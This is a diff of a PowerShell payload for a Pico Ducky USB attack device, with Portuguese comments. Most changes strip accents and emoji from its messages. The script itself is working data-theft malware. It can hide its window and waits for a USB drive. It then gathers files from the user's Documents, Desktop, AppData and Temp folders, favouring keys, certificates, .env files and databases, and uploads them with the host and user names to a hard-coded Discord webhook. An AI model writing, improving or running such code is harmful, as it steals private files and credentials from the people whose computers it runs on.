@@ -2,22 +2,21 @@
 .SYNOPSIS
     Coleta arquivos de um computador e envia para um webhook do Discord.
 .DESCRIPTION
-    Aguarda a conexão de um USB, coleta arquivos de pastas do usuário atual
+    Aguarda a conexao de um USB, coleta arquivos de pastas do usuario atual
     (incluindo Temp, AppData\Local, AppData\Roaming), limita a 10 arquivos
     por lote e 8MB por arquivo, e envia para o Discord.
-    Envia mensagens de status no início e no final da execução.
 .NOTES
     Autor: Adaptado para Pico Ducky
     Limites: 10 arquivos/lote, 8MB/arquivo
 #>
 
-# ============= CONFIGURAÇÃO =============
+# ============= CONFIGURACAO =============
 $webhookUrl = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"
 $maxFilesPerBatch = 10
 $maxFileSizeMB = 8
 $maxFileSizeBytes = $maxFileSizeMB * 1MB
 
-# ============= FUNÇÕES =============
+# ============= FUNCOES =============
 function Send-DiscordMessage {
     param(
         [string]$Message,
@@ -46,7 +45,7 @@ function Send-FilesToDiscord {
     $files = Get-ChildItem -Path $FolderPath -File | Where-Object { $_.Length -le $MaxSizeBytes }
     
     if ($files.Count -eq 0) {
-        Write-Host "Nenhum arquivo válido para enviar (tamanho <= 8MB)." -ForegroundColor Yellow
+        Write-Host "Nenhum arquivo valido para enviar (tamanho <= 8MB)." -ForegroundColor Yellow
         return @{sent = 0; skipped = 0}
     }
     
@@ -65,7 +64,7 @@ function Send-FilesToDiscord {
         
         $fileList = ($batch | ForEach-Object { "- $($_.Name) ($([math]::Round($_.Length / 1KB, 1)) KB)" }) -join "`n"
         $headerMessage = @{
-            content = "📦 **Lote $batchNumber**`n📁 Pasta: $FolderPath`n📄 Arquivos neste lote:`n$fileList"
+            content = "[Lote $batchNumber] Pasta: $FolderPath`nArquivos:`n$fileList"
         } | ConvertTo-Json
         
         try {
@@ -73,7 +72,7 @@ function Send-FilesToDiscord {
             Start-Sleep -Milliseconds 300
         }
         catch {
-            Write-Host "Erro ao enviar cabeçalho do lote: $_" -ForegroundColor Red
+            Write-Host "Erro ao enviar cabecalho do lote: $_" -ForegroundColor Red
         }
         
         foreach ($file in $batch) {
@@ -84,17 +83,15 @@ function Send-FilesToDiscord {
                     continue
                 }
                 
-                # Envia como texto se for pequeno e de extensão texto
+                # Envia como texto se for pequeno e de extensao texto
                 if ($file.Length -lt 2000 -and ($file.Extension -in '.txt','.log','.json','.cfg','.conf','.xml','.ini','.yaml','.config','.env','.csv','.forms')) {
                     $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
                     if ($content) {
-                        $truncatedContent = if ($content.Length -gt 1900) {
-                            $content.Substring(0, 1900) + "... [truncado]"
-                        } else {
-                            $content
+                        if ($content.Length -gt 1900) {
+                            $content = $content.Substring(0, 1900) + "... [truncado]"
                         }
                         $body = @{
-                            content = "**📄 $($file.Name)**`n```$truncatedContent```"
+                            content = "Arquivo: $($file.Name)`n```$content```"
                         } | ConvertTo-Json
                         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
                         Write-Host "Enviado (texto): $($file.Name)" -ForegroundColor Green
@@ -104,13 +101,13 @@ function Send-FilesToDiscord {
                     }
                 }
                 
-                # Envia como anexo para arquivos maiores ou binários
+                # Envia como anexo
                 $boundary = [System.Guid]::NewGuid().ToString()
                 $LF = "`r`n"
                 $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
                 $fileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
                 $fileSizeKB = [math]::Round($file.Length / 1KB, 1)
-                $contentText = "📎 $($file.Name) ($fileSizeKB KB)"
+                $contentText = "Anexo: $($file.Name) ($fileSizeKB KB)"
                 
                 $bodyLines = @(
                     "--$boundary",
@@ -136,7 +133,7 @@ function Send-FilesToDiscord {
         
         $batchNumber++
         if ($fileIndex -lt $files.Count) {
-            Write-Host "Aguardando 2 segundos antes do próximo lote..." -ForegroundColor Gray
+            Write-Host "Aguardando 2 segundos antes do proximo lote..." -ForegroundColor Gray
             Start-Sleep -Seconds 2
         }
     }
@@ -148,7 +145,7 @@ function Send-FilesToDiscord {
     }
 }
 
-# ============= OCULTAÇÃO DA JANELA (UMA ÚNICA VEZ) =============
+# ============= OCULTACAO DA JANELA =============
 function Hide-Window {
     Write-Host "Ocultando a janela..." -ForegroundColor Yellow
     Start-Sleep 1
@@ -166,32 +163,26 @@ function Hide-Window {
             $Proc = Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' }
             $hwnd = $Proc.MainWindowHandle
             $Type::ShowWindowAsync($hwnd, 0)
-            Write-Host "Janela ocultada com sucesso (via título)." -ForegroundColor Green
+            Write-Host "Janela ocultada com sucesso (via titulo)." -ForegroundColor Green
         }
     }
     catch {
-        Write-Host "Não foi possível ocultar a janela: $_" -ForegroundColor Red
+        Write-Host "Nao foi possivel ocultar a janela: $_" -ForegroundColor Red
     }
 }
 
-# ============= CORPO PRINCIPAL DO SCRIPT =============
+# ============= CORPO PRINCIPAL =============
 Clear-Host
 
-# --- Passo 0: Enviar mensagem de INÍCIO ---
-Write-Host "Enviando mensagem de início para o Discord..." -ForegroundColor Cyan
-$startMessage = "🚀 **Sistema Iniciado**`n" +
-                "⏰ Data/Hora: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')`n" +
-                "💻 Computador: $env:COMPUTERNAME`n" +
-                "👤 Usuário: $env:USERNAME`n" +
-                "🔗 Aguardando USB para coleta..."
-
+Write-Host "Enviando mensagem de inicio..." -ForegroundColor Cyan
+$startMessage = "[Sistema Iniciado] Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss') Computador: $env:COMPUTERNAME Usuario: $env:USERNAME"
 $webhookOk = Send-DiscordMessage -Message $startMessage -WebhookUrl $webhookUrl
 
 if (-not $webhookOk) {
-    Write-Host "⚠️ Não foi possível enviar mensagem de início. Verifique o webhook." -ForegroundColor Yellow
+    Write-Host "Aviso: Nao foi possivel enviar mensagem de inicio. Verifique o webhook." -ForegroundColor Yellow
 }
 
-# --- Passo 1: Aguardar o USB ---
+# --- Aguardar o USB ---
 $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
 $count = $removableDrives.count
 $i = 30
@@ -199,7 +190,7 @@ $i = 30
 Write-Host "Aguardando dispositivo USB... (30s timeout)" -ForegroundColor Yellow
 
 if ($webhookOk) {
-    $waitingMessage = "⏳ Aguardando conexão de USB... (30 segundos)"
+    $waitingMessage = "Aguardando USB... (30s)"
     Send-DiscordMessage -Message $waitingMessage -WebhookUrl $webhookUrl | Out-Null
 }
 
@@ -212,7 +203,7 @@ while ($true) {
     if ($count -ne $removableDrives.count) {
         Write-Host "USB conectado!" -ForegroundColor Green
         if ($webhookOk) {
-            $usbMessage = "💾 **USB Conectado!**`n📂 Iniciando coleta de arquivos..."
+            $usbMessage = "USB Conectado! Iniciando coleta..."
             Send-DiscordMessage -Message $usbMessage -WebhookUrl $webhookUrl | Out-Null
         }
         break
@@ -222,7 +213,7 @@ while ($true) {
     if ($i -eq 0) {
         Write-Host "Tempo esgotado! Saindo..." -ForegroundColor Red
         if ($webhookOk) {
-            $timeoutMessage = "⏰ **Timeout!**`nNenhum USB conectado em 30 segundos.`nScript encerrado."
+            $timeoutMessage = "Timeout! Nenhum USB conectado em 30s. Script encerrado."
             Send-DiscordMessage -Message $timeoutMessage -WebhookUrl $webhookUrl | Out-Null
         }
         Start-Sleep 2
@@ -230,12 +221,11 @@ while ($true) {
     }
 }
 
-# --- Passo 2: Detectar o drive e criar pasta ---
+# --- Detectar o drive e criar pasta ---
 $drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1
 $driveLetter = $drive.DeviceID
 Write-Host "Drive de destino: $driveLetter/" -ForegroundColor Green
 
-# ============= EXTENSÕES =============
 $fileExtensions = @(
     "*.log", "*.db", "*.txt", "*.json", "*.doc", "*.pdf", 
     "*.jpg", "*.jpeg", "*.png", "*.cer", "*.key", "*.xls", 
@@ -245,7 +235,6 @@ $fileExtensions = @(
     "*.pem", "*.crt", "*.pkcs12", "*.pfx"
 )
 
-# ============= PASTAS (APENAS USUÁRIO ATUAL) =============
 $foldersToSearch = @(
     "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Desktop", 
@@ -271,17 +260,16 @@ if (-not (Test-Path -Path $destinationPath)) {
     Write-Host "Pasta criada: $destinationPath" -ForegroundColor Green
 }
 
-# --- Passo 3: Ocultar a janela (opcional) ---
-# Se você já usa -WindowStyle Hidden no payload, pode comentar a linha abaixo:
+# --- (Opcional) Ocultar a janela ---
 # Hide-Window
 
-# --- Passo 4: Coletar os arquivos ---
+# --- Coletar os arquivos ---
 $driveIndex = 0
 $collectedFiles = @()
 $skippedLargeFiles = 0
 $totalFilesFound = 0
 
-Write-Host "Coletando arquivos (máx. 8MB por arquivo)..." -ForegroundColor Cyan
+Write-Host "Coletando arquivos (max. 8MB por arquivo)..." -ForegroundColor Cyan
 
 foreach ($folder in $foldersToSearch) {
     if (-not (Test-Path $folder)) { continue }
@@ -304,7 +292,7 @@ foreach ($folder in $foldersToSearch) {
                     if (-not $drive) {
                         Write-Host "USB desconectado! Encerrando..." -ForegroundColor Red
                         if ($webhookOk) {
-                            $disconnectMessage = "⚠️ **USB Desconectado!**`nScript interrompido antes da conclusão."
+                            $disconnectMessage = "USB Desconectado! Script interrompido."
                             Send-DiscordMessage -Message $disconnectMessage -WebhookUrl $webhookUrl | Out-Null
                         }
                         exit
@@ -341,39 +329,27 @@ if ($skippedLargeFiles -gt 0) {
     Write-Host "  Arquivos ignorados (>8MB): $skippedLargeFiles" -ForegroundColor Yellow
 }
 
-# --- Passo 5: Enviar para o Discord ---
+# --- Enviar para o Discord ---
 if ($collectedFiles.Count -gt 0) {
-    Write-Host "`nEnviando para o Discord (máx. $maxFilesPerBatch arquivos por lote)..." -ForegroundColor Cyan
+    Write-Host "`nEnviando para o Discord (max. $maxFilesPerBatch arquivos por lote)..." -ForegroundColor Cyan
     
     $result = Send-FilesToDiscord -FolderPath $destinationPath -WebhookUrl $webhookUrl -MaxFiles $maxFilesPerBatch -MaxSizeBytes $maxFileSizeBytes
     
-    $summaryMessage = "✅ **Coleta concluída!**`n" +
-                      "📁 Pasta: $destinationPath`n" +
-                      "📄 Total encontrado: $totalFilesFound`n" +
-                      "📄 Coletados: $($collectedFiles.Count)`n" +
-                      "📤 Enviados: $($result.sent)`n" +
-                      "⏭️ Ignorados (>8MB): $($result.skipped + $skippedLargeFiles)`n" +
-                      "💻 Computador: $env:COMPUTERNAME`n" +
-                      "👤 Usuário: $env:USERNAME`n" +
-                      "⏰ Finalizado em: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
+    $summaryMessage = "[Coleta Concluida] Pasta: $destinationPath Total: $totalFilesFound Coletados: $($collectedFiles.Count) Enviados: $($result.sent) Ignorados (>8MB): $($result.skipped + $skippedLargeFiles) Computador: $env:COMPUTERNAME Usuario: $env:USERNAME Finalizado: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
     
     Send-DiscordMessage -Message $summaryMessage -WebhookUrl $webhookUrl
     
-    $endMessage = "🏁 **Sistema Finalizado**`n" +
-                  "✅ Todas as operações concluídas com sucesso.`n" +
-                  "⏰ Data/Hora: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')`n" +
-                  "📦 Total de lotes enviados: $([math]::Ceiling($collectedFiles.Count / $maxFilesPerBatch))"
-    
+    $endMessage = "[Sistema Finalizado] Todas as operacoes concluidas. Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss') Total de lotes: $([math]::Ceiling($collectedFiles.Count / $maxFilesPerBatch))"
     Send-DiscordMessage -Message $endMessage -WebhookUrl $webhookUrl
 }
 else {
     if ($webhookUrl -eq "SEU_WEBHOOK_URL_AQUI") {
-        Write-Host "`nWebhook não configurado! Arquivos salvos em: $destinationPath" -ForegroundColor Red
-        $errorMessage = "❌ **Erro de Configuração**`nWebhook não configurado.`nArquivos salvos localmente em: $destinationPath"
+        Write-Host "`nWebhook nao configurado! Arquivos salvos em: $destinationPath" -ForegroundColor Red
+        $errorMessage = "[Erro] Webhook nao configurado. Arquivos salvos localmente em: $destinationPath"
         Send-DiscordMessage -Message $errorMessage -WebhookUrl $webhookUrl
     } else {
         Write-Host "`nNenhum arquivo coletado." -ForegroundColor Yellow
-        $noFilesMessage = "📭 **Nenhum Arquivo Encontrado**`nO script não encontrou arquivos com as extensões especificadas.`n💻 Computador: $env:COMPUTERNAME`n👤 Usuário: $env:USERNAME"
+        $noFilesMessage = "[Nenhum Arquivo] Nenhum arquivo encontrado. Computador: $env:COMPUTERNAME Usuario: $env:USERNAME"
         Send-DiscordMessage -Message $noFilesMessage -WebhookUrl $webhookUrl
     }
 }
